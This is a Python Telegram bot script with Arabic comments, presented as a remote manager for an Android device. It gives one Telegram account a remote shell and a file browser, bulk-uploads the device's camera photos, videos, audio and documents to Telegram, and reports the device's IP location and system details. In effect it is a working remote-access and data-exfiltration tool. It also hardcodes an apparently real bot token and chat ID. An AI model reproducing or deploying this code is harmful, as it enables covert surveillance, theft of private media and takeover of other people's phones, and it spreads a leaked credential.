#!/usr/bin/env python3
# zz_bot_control.py  –  Telegram Remote Manager (rev 2025-07-08)

import os, subprocess, shlex, threading, datetime, platform, requests, psutil
from pathlib import Path
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ── الإعدادات الأساسية ───────────────────────────────────
TOKEN  = "8172030096:AAHYj3A8rYLksWsEZWVZQwVKCUj_2HSf3qQ"   # ← توكنك
OWNER  = 7576196820                                          # ← chat_id الخاص بك
MAX_MB   = 20
MAX_OUT  = 6000

bot = TeleBot(TOKEN, parse_mode="HTML")
LOG = Path("zz_bot.log")

# ── مجلد العمل الحالي لأوامر الشيل ───────────────────────
cwd = Path.home()

# ── مسارات أندرويد الافتراضية (اختياري) ─────────────────
SHARED = Path.home() / "storage" / "shared"
PIC_DIR = [SHARED/"DCIM/Camera", SHARED/"Pictures"]
VID_DIR = [SHARED/"Movies", SHARED/"Videos", SHARED/"DCIM/Camera"]
AUD_DIR = [SHARED/"Music", SHARED/"Download"]
DOC_DIR = [SHARED/"Documents", SHARED/"Download"]

flags, stop_all, _ls_cache = {}, False, {}

def log(txt):
    with LOG.open("a", encoding="utf-8") as f:
        f.write(f"[{datetime.datetime.now():%F %T}] {txt}\n")

def mb(p: Path): return p.stat().st_size / 1_048_576
def allowed(uid): return uid == OWNER
def walk(dirs, exts):
    for root in dirs:
        if not root.exists(): continue
        for f in root.rglob("*"):
            if f.is_file() and f.suffix.lower() in exts and mb(f) <= MAX_MB:
                yield f

# ── لوحة الأزرار ─────────────────────────────────────────
def main_menu():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🖼️ صور",  callback_data="pics"),
        InlineKeyboardButton("🎞️ فيديو", callback_data="vids"),
        InlineKeyboardButton("🎵 صوت",   callback_data="aud"),
        InlineKeyboardButton("📄 مستند", callback_data="doc")
    )
    kb.add(
        InlineKeyboardButton("⛔ إيقاف الكل", callback_data="stopall"),
        InlineKeyboardButton("💻 نظام",   callback_data="sys"),
        InlineKeyboardButton("🌐 IP",     callback_data="ip"),
        InlineKeyboardButton("📜 سجلات",  callback_data="log")
    )
    kb.add(
        InlineKeyboardButton("🖥️ أوامر شيل", callback_data="shellhelp"),
        InlineKeyboardButton("📂 /ls",       callback_data="ls")
    )
    return kb

def refresh(chat, msg_id, text):
    bot.edit_message_text(text, chat, msg_id,
                          reply_markup=main_menu(), parse_mode="HTML")

# ── إرسال دفعات ملفات (صور/فيديو/صوت/مستند) ─────────────
def batch(chat, kind, iterator, msg_id):
    global stop_all
    for f in iterator:
        if flags.get(kind) or stop_all:
            break
        try:
            with f.open("rb") as fp:
                bot.send_document(chat, fp, caption=f.name)
        except Exception as e:
            bot.send_message(chat, f"⚠️ {f.name}: {e}")
    flags[kind] = False
    stop_all = False
    refresh(chat, msg_id, f"✅ انتهى <b>{kind}</b>")
    log(f"{kind} batch complete")

# ── أوامر البوت النصية ───────────────────────────────────
@bot.message_handler(commands=["start"])
def start(m):
    if not allowed(m.from_user.id):
        return
    txt = ("🔹 <b>لوحة التحكُّم</b>\n"
           "👑 المالك: <code>Youssef</code>\n"
           f"📂 cwd: <code>{cwd}</code>\n\n"
           "اختر من الأزرار:")
    bot.send_message(m.chat.id, txt,
                     reply_markup=main_menu(), parse_mode="HTML")

@bot.message_handler(commands=["stopall"])
def stopall_cmd(m):
    global stop_all
    if not allowed(m.from_user.id):
        return
    stop_all = True
    for k in flags:
        flags[k] = True
    bot.reply_to(m, "⛔ تم إيقاف كل العمليات.")

# أوامر شيل (/sh … أو !…)
@bot.message_handler(func=lambda m: allowed(m.from_user.id) and (m.text.startswith("/sh ") or m.text.startswith("!")))
def shell(m):
    global cwd
    raw = m.text[4:] if m.text.startswith("/sh ") else m.text[1:]
    if raw.strip().startswith("cd"):
        target = raw.strip()[2:].strip() or str(Path.home())
        new = (cwd / target).resolve() if not Path(target).is_absolute() else Path(target).resolve()
        if new.exists():
            cwd = new
            bot.reply_to(m, f"📂 cwd → <code>{cwd}</code>", parse_mode="HTML")
        else:
            bot.reply_to(m, "❌ مسار غير موجود")
        return
    try:
        out = subprocess.check_output(shlex.split(raw), cwd=str(cwd),
                                      stderr=subprocess.STDOUT, timeout=20)
        txt = out.decode(errors="ignore") or "[no output]"
    except subprocess.CalledProcessError as e:
        txt = e.output.decode(errors="ignore") or str(e)
    except Exception as e:
        txt = str(e)
    if len(txt) > MAX_OUT:
        txt = txt[:MAX_OUT] + "…"
    bot.reply_to(m, f"<code>{txt}</code>", parse_mode="HTML")

# ── مدير ملفات تفاعلي (/ls) ───────────────────────────────
def list_dir(chat, msg_id):
    _ls_cache.clear()
    kb = InlineKeyboardMarkup(row_width=2)
    if cwd.parent != cwd:
        kb.add(InlineKeyboardButton("📂 ⬆️..", callback_data="ls_up"))
    idx = 0
    for p in sorted(cwd.iterdir(), key=lambda s: (not s.is_dir(), s.name.lower())):
        key = str(idx)
        _ls_cache[key] = p
        label = ("📂 " if p.is_dir() else "📄 ") + p.name[:40]
        code = ("ls_d_" if p.is_dir() else "ls_f_") + key
        kb.add(InlineKeyboardButton(label, callback_data=code))
        idx += 1
    bot.edit_message_text(f"📂 <b>{cwd}</b>", chat, msg_id,
                          reply_markup=kb, parse_mode="HTML")

# ── معالج أزرار الكولباك ─────────────────────────────────
@bot.callback_query_handler(func=lambda _: True)
def cb(c):
    global stop_all, cwd
    if not allowed(c.from_user.id):
        return bot.answer_callback_query(c.id, "🚫")
    d, chat, ms = c.data, c.message.chat.id, c.message.message_id

    # دفعات الملفات
    if d in ("pics", "vids", "aud", "doc"):
        kind = d
        ext_dirs = {
            "pics": ({".jpg",".jpeg",".png",".gif"}, PIC_DIR),
            "vids": ({".mp4",".avi",".mkv",".mov"}, VID_DIR),
            "aud":  ({".mp3",".wav",".ogg",".flac"}, AUD_DIR),
            "doc":  ({".pdf",".txt",".doc",".docx",".ppt",".pptx",
                      ".xls",".xlsx",".zip",".rar"}, DOC_DIR)
        }
        exts, dirs = ext_dirs[kind]
        flags[kind] = False
        bot.answer_callback_query(c.id, f"جاري {kind}")
        threading.Thread(target=batch,
                         args=(chat, kind, walk(dirs, exts), ms),
                         daemon=True).start()

    elif d == "stopall":
        stop_all = True
        for k in flags:
            flags[k] = True
        bot.answer_callback_query(c.id, "🛑")

    elif d == "sys":
        v = psutil.virtual_memory(); du = psutil.disk_usage("/")
        txt = (f"<b>OS:</b> {platform.system()} {platform.release()} {platform.machine()}\n"
               f"<b>CPU:</b> {platform.processor()}\n"
               f"<b>RAM:</b> {round(v.total/1e9,1)} GB • Free {round(v.available/1e9,1)} GB\n"
               f"<b>Disk free:</b> {round(du.free/1e9,1)} GB\n"
               f"<b>cwd:</b> <code>{cwd}</code>")
        refresh(chat, ms, txt)

    elif d == "ip":
        try:
            j = requests.get("https://ipinfo.io/json", timeout=5).json()
            loc = " - ".join([j.get(k) for k in ("city","region","country") if j.get(k)])
            txt = f"<b>IP:</b> {j.get('ip')}<br><b>Loc:</b> {loc or 'N/A'}"
            refresh(chat, ms, txt)
        except Exception as e:
            bot.answer_callback_query(c.id, f"⚠️ {e}")

    elif d == "log":
        with LOG.open("rb") as fp:
            bot.send_document(chat, fp)

    elif d == "shellhelp":
        bot.answer_callback_query(c.id)
        bot.send_message(chat, "أرسل <code>/sh</code> أو <code>!</code> قبل الأمر.\n"
                               "مثال: <code>/sh ls -al</code>\n"
                               "زر /ls لاستعراض الملفات.", parse_mode="HTML")

    # مدير الملفات
    elif d == "ls":
        list_dir(chat, ms)
    elif d == "ls_up":
        cwd = cwd.parent
        list_dir(chat, ms)
    elif d.startswith("ls_d_"):
        cwd = _ls_cache.get(d.split("_")[-1], cwd)
        list_dir(chat, ms)
    elif d.startswith("ls_f_"):
        f = _ls_cache.get(d.split("_")[-1])
        bot.answer_callback_query(c.id, "📤")
        if f and mb(f) <= MAX_MB:
            with f.open("rb") as fp:
                bot.send_document(chat, fp, caption=f.name)
        else:
            bot.send_message(chat, "❌ الملف أكبر من 20 MB أو غير موجود.")

# ── تشغيل البوت ──────────────────────────────────────────
log("BOT STARTED")
bot.infinity_polling(skip_pending=True)
